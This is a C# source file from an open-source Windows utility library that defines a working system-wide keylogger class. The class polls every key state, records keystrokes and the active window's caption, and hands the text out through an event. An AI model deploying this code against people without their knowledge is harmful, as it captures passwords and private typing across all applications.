/*
 * @author            : Blake Pell
 * @website           : http://www.blakepell.com
 * @initial date      : 2006-06-09 (Based off VB6 code written in 1999)
 * @last updated      : 2019-11-22
 * @copyright         : Copyright (c) 2003-2022, All rights reserved.
 * @license           : MIT
 */

using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Argus.Windows.Hardware
{
    /// <summary>
    /// An event driven key logger with support for including the active window caption when it changes.
    /// </summary>
    /// <code>
    /// // WinForms Example
    /// private void DataReceived(object sender, InputEventArgs e)
    /// {
    ///     if (this.InvokeRequired)
    ///     {
    ///         this?.Invoke(new MethodInvoker(() =&gt; { richTextBox1?.AppendText(e.Text); }));
    ///     }
    ///     else
    ///     {
    ///         if (!richTextBox1.IsDisposed)
    ///         {
    ///             richTextBox1?.AppendText(e.Text);
    ///         }
    ///         else
    ///         {
    ///             _monitor.Stop();
    ///             _monitor.Dispose();
    ///             Application.Exit();
    ///         }
    ///     }
    /// }
    /// </code>
    public class KeyLogger : IDisposable
    {
        private readonly object _messagesLock = new object();

        // To detect redundant calls
        private bool _disposedValue;
        private Thread _logThread;

        /// <summary>
        /// Constructor
        /// </summary>
        public KeyLogger()
        {
            _logThread = new Thread(this.ReadKeyboard);
        }

        /// <summary>
        /// The Priority of the key logging thread.
        /// </summary>
        public ThreadPriority ThreadPriority
        {
            get => _logThread.Priority;
            set => _logThread.Priority = value;
        }

        /// <summary>
        /// Whether or not to include the current caption of the active window when it changes
        /// in the buffer.
        /// </summary>
        public bool IncludeCurrentWindowCaption { get; set; } = true;

        /// <summary>
        /// Whether or not to include mouse information when logging text.  The default value for this property is False.
        /// </summary>
        public bool IncludeMouseEvents { get; set; } = false;

        /// <summary>
        /// Disposes of resources.
        /// </summary>
        public void Dispose()
        {
            this.Dispose(true);
            GC.SuppressFinalize(this);
        }

        [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int GetForegroundWindow();

        [DllImport("user32", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)]
        private static extern int GetWindowTextLength(int hwnd);

        [DllImport("user32", EntryPoint = "GetWindowTextA", SetLastError = true, ExactSpelling = true, BestFitMapping = true, CharSet = CharSet.Ansi)]
        private static extern int GetWindowText(int hwnd, StringBuilder sb, int cch);

        [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int GetParent(int hwnd);

        /// <summary>
        /// Event handler that's raised when data is received.
        /// </summary>
        public event EventHandler<InputEventArgs> DataReceived;

        /// <summary>
        /// Method to raise the DataReceived event.
        /// </summary>
        /// <param name="e"></param>
        protected virtual void OnDataReceived(InputEventArgs e)
        {
            var handler = this.DataReceived;
            handler?.Invoke(this, e);
        }

        /// <summary>
        /// Starts the key logger thread.
        /// </summary>
        public void Start()
        {
            _logThread.Start();
        }

        /// <summary>
        /// Stops the key logger thread.
        /// </summary>
        public void Stop()
        {
            _logThread.Abort();
            _logThread = new Thread(this.ReadKeyboard);
        }

        /// <summary>
        /// Whether or not the key logging thread is still active.
        /// </summary>
        public bool StillActive()
        {
            return _logThread.IsAlive;
        }

        /// <summary>
        /// Reads input from the keyboard.
        /// </summary>
        private void ReadKeyboard()
        {
            string _lastWindowText = "";

            do
            {
                lock (_messagesLock)
                {
                    string windowText = "";
                    string key = "";

                    // Get the window text and remove any null characters
                    windowText = this.GetActiveWindowTitle(false);
                    windowText = windowText.Replace("\0", "");

                    if (this.IncludeCurrentWindowCaption)
                    {
                        if ((windowText != _lastWindowText) & !string.IsNullOrEmpty(windowText))
                        {
                            key += $"[Window: {windowText}] \r\n\r\n";
                            _lastWindowText = windowText;
                            windowText = "";
                        }
                    }

                    for (int i = 1; i <= 255; i++)
                    {
                        int result = GetAsyncKeyState(i);

                        if (result != -32767)
                        {
                            continue;
                        }

                        // characters to ignore
                        switch (i)
                        {
                            case 1:
                                if (this.IncludeMouseEvents == false)
                                {
                                }
                                else
                                {
                                    key += "[LeftMouse] ";
                                }

                                break;
                            case 2:
                                if (this.IncludeMouseEvents == false)
                                {
                                }
                                else
                                {
                                    key += "[RightMouse] ";
                                }

                                break;
                            case 3:
                                key += "[ControlBreak] ";

                                break;
                            case 4:
                                if (this.IncludeMouseEvents == false)
                                {
                                }
                                else
                                {
                                    key += "[MiddleMouse] ";
                                }

                                break;
                            case 5:
                                if (this.IncludeMouseEvents == false)
                                {
                                }
                                else
                                {
                                    key += "[X1Mouse] ";
                                }

                                break;
                            case 6:
                                if (this.IncludeMouseEvents == false)
                                {
                                }
                                else
                                {
                                    key += "[X2Mouse] ";
                                }

                                break;
                            case 13:
                                key += "\r\n";

                                break;
                            case 16:
                            case 160:
                            case 161:
                                // Ignore but continue.
                                continue;
                            case 164:
                            case 165:
                            case 18:
                                if (i == 18)
                                {
                                    break;
                                }

                                key += "[Alt] ";

                                break;
                            case 17:
                            case 162:
                            case 163:
                                if (i == 17)
                                {
                                    break;
                                }

                                key += "[Control] ";

                                break;
                            case 8:
                                key += "[BkSp] ";

                                break;
                            case 9:
                                key += "[Tab] ";

                                break;
                            case 19:
                                key += "[Pause] ";

                                break;
                            case 27:
                                key += "[Esc] ";

                                break;
                            case 33:
                                key += "[PgUp] ";

                                break;
                            case 34:
                                key += "[PgDn] ";

                                break;
                            case 35:
                                key += "[End] ";

                                break;
                            case 36:
                                key += "[Home] ";

                                break;
                            case 37:
                                key += "[Left] ";

                                break;
                            case 38:
                                key += "[Up] ";

                                break;
                            case 39:
                                key += "[Right] ";

                                break;
                            case 40:
                                key += "[Down] ";

                                break;
                            case 44:
                                key += "[PrntScrn] ";

                                break;
                            case 45:
                                key += "[Insert] ";

                                break;
                            case 46:
                                key += "[Delete] ";

                                break;
                            case 91:
                            case 92:
                                key += "[Win] ";

                                break;
                            case 111:
                                key += "/";

                                break;
                            case 112:
                                key += "[F1] ";

                                break;
                            case 113:
                                key += "[F2] ";

                                break;
                            case 114:
                                key += "[F3] ";

                                break;
                            case 115:
                                key += "[F4] ";

                                break;
                            case 116:
                                key += "[F5] ";

                                break;
                            case 117:
                                key += "[F6] ";

                                break;
                            case 118:
                                key += "[F7] ";

                                break;
                            case 119:
                                key += "[F8] ";

                                break;
                            case 120:
                                key += "[F9] ";

                                break;
                            case 121:
                                key += "[F10] ";

                                break;
                            case 122:
                                key += "[F11] ";

                                break;
                            case 123:
                                key += "[F12] ";

                                break;
                            case 190:
                                if (this.IsShiftDown())
                                {
                                    key += ">";
                                }
                                else
                                {
                                    key += ".";
                                }

                                break;
                            case 191:
                                if (this.IsShiftDown())
                                {
                                    key += "?";
                                }
                                else
                                {
                                    key += "/";
                                }

                                break;
                            case 188:
                                if (this.IsShiftDown())
                                {
                                    key += "<";
                                }
                                else
                                {
                                    key += ",";
                                }

                                break;
                            case 96:
                                key += "~";

                                break;
                            case 186:
                                if (this.IsShiftDown())
                                {
                                    key += ":";
                                }
                                else
                                {
                                    key += ";";
                                }

                                break;
                            case 187:
                                if (this.IsShiftDown())
                                {
                                    key += "+";
                                }
                                else
                                {
                                    key += "=";
                                }

                                break;
                            case 189:
                                if (this.IsShiftDown())
                                {
                                    key += "_";
                                }
                                else
                                {
                                    key += "-";
                                }

                                break;
                            case 192:
                                if (this.IsShiftDown())
                                {
                                    key += "~";
                                }
                                else
                                {
                                    key += "`";
                                }

                                break;
                            case 219:
                                if (this.IsShiftDown())
                                {
                                    key += "{";
                                }
                                else
                                {
                                    key += "[";
                                }

                                break;
                            case 220:
                                if (this.IsShiftDown())
                                {
                                    key += "|";
                                }
                                else
                                {
                                    key += "\\";
                                }

                                break;
                            case 221:
                                if (this.IsShiftDown())
                                {
                                    key += "}";
                                }
                                else
                                {
                                    key += "]";
                                }

                                break;
                            case 222:
                                if (this.IsShiftDown())
                                {
                                    key += "\"";
                                }
                                else
                                {
                                    key += "'";
                                }

                                break;
                            case 226:
                                key += "\\";

                                break;
                            case 254:
                                key += "'";

                                break;
                            default:
                                if (this.IsShiftDown())
                                {
                                    // Shift
                                    switch (i)
                                    {
                                        case 48:
                                            key += ")";

                                            break;
                                        case 49:
                                            key += "!";

                                            break;
                                        case 50:
                                            key += "@";

                                            break;
                                        case 51:
                                            key += "#";

                                            break;
                                        case 52:
                                            key += "$";

                                            break;
                                        case 53:
                                            key += "%";

                                            break;
                                        case 54:
                                            key += "^";

                                            break;
                                        case 55:
                                            key += "&";

                                            break;
                                        case 56:
                                            key += "*";

                                            break;
                                        case 57:
                                            key += "(";

                                            break;
                                        default:
                                            key += Convert.ToString((char) i).ToUpper();

                                            break;
                                    }
                                }
                                else if (this.IsCapsLockDown())
                                {
                                    // Caps Lock
                                    switch (i)
                                    {
                                        case 32:
                                        case 192:
                                        case 49:
                                        case 50:
                                        case 51:
                                        case 52:
                                        case 53:
                                        case 54:
                                        case 55:
                                        case 56:
                                        case 57:
                                        case 48:
                                        case 189:
                                        case 187:
                                        case 8:
                                        case 219:
                                        case 221:
                                        case 220:
                                        case 186:
                                        case 222:
                                        case 13:
                                        case 188:
                                        case 190:
                                        case 191:
                                        case 45:
                                        case 46:
                                        case 107:
                                        case 34:
                                        case 40:
                                        case 35:
                                        case 39:
                                        case 12:
                                        case 37:
                                        case 33:
                                        case 38:
                                        case 36:
                                        case 109:
                                        case 106:
                                        case 111:
                                            //We don't want to show a shift with caps lock and numbers
                                            key += (char) i;

                                            break;
                                        case 20:
                                            break;
                                        // do nothing
                                        default:
                                            key += Convert.ToString((char) i).ToUpper();

                                            break;
                                    }
                                }
                                else
                                {
                                    // No Shift
                                    key += Convert.ToString((char) i).ToLower();
                                }

                                break;
                        }
                    }

                    // Only raise the event if something is there.  There is a CPU cost for the Delegate/Invoke/Event calling.
                    if (string.IsNullOrEmpty(key) == false)
                    {
                        var e = new InputEventArgs
                        {
                            Text = key
                        };

                        this.OnDataReceived(e);
                    }
                }

                Thread.Sleep(1);
            } while (true);
        }

        /// <summary>
        /// Whether the right or left shift key is down (or caps lock is down).
        /// </summary>
        public bool IsShiftDown()
        {
            short leftShift = GetAsyncKeyState(160);
            short rightShift = GetAsyncKeyState(161);

            if ((leftShift & 0x8000) > 0)
            {
                return true;
            }

            if ((rightShift & 0x8000) > 0)
            {
                return true;
            }

            return false;
        }

        /// <summary>
        /// Whether or not the caps lock key is down.
        /// </summary>
        /// <remarks>TODO: This doesn't work</remarks>
        public bool IsCapsLockDown()
        {
            short capsLock = GetAsyncKeyState(20);

            if ((capsLock & 1) > 0)
            {
                return true;
            }

            return false;
        }

        /// <summary>
        /// Returns the title/caption of the active window.
        /// </summary>
        /// <param name="returnParent">If true returns the parent's window title.</param>
        public string GetActiveWindowTitle(bool returnParent)
        {
            int j = 0;
            int i = GetForegroundWindow();

            if (returnParent)
            {
                while (i != 0)
                {
                    j = i;
                    i = GetParent(i);
                }

                i = j;
            }

            return this.GetWindowTitle(i);
        }

        /// <summary>
        /// Returns the window title/caption given a handle.
        /// </summary>
        /// <param name="hwnd"></param>
        public string GetWindowTitle(int hwnd)
        {
            int l = GetWindowTextLength(hwnd);
            var sb = new StringBuilder(l);

            GetWindowText(hwnd, sb, l + 1);

            return sb.ToString();
        }

        /// <summary>
        /// Formats text for a provided event name.
        /// </summary>
        /// <param name="eventName"></param>
        /// <param name="eventText"></param>
        public string GetEventText(string eventName, string eventText)
        {
            return $"[{eventName}: {eventText}]\r\n\r\n";
        }

        /// <summary>
        /// Remove the backspace character string and the character previous to it.  Note, this doesn't work well if processed over
        /// an entire log of text since intermittent backspaces can be processed, say if a window changes and then changes back where
        /// the context changes (e.g. you jump from one text box to another).
        /// </summary>
        /// <param name="text"></param>
        public static string CleanupBackspaces(string text)
        {
            if (string.IsNullOrEmpty(text))
            {
                return text;
            }

            // Replace the verbose backspace with the backspace character
            string bs = Convert.ToString((char) 8);
            text = text.Replace("[BkSp] ", bs);

            var result = new StringBuilder(text.Length);

            foreach (char c in text)
            {
                if (c == 8)
                {
                    if (result.Length > 0)
                    {
                        result.Length -= 1;
                    }
                }
                else
                {
                    result.Append(c);
                }
            }

            return result.ToString();
        }

        /// <summary>
        /// Disposes of resources.
        /// </summary>
        /// <param name="disposing"></param>
        protected virtual void Dispose(bool disposing)
        {
            if (!_disposedValue)
            {
                if (disposing)
                {
                    if (_logThread != null)
                    {
                        _logThread.Abort();
                        _logThread = null;
                    }
                }
            }

            _disposedValue = true;
        }
    }

    /// <summary>
    /// Input Event Arguments
    /// </summary>
    public class InputEventArgs : EventArgs
    {
        public string Text { get; set; }
    }
}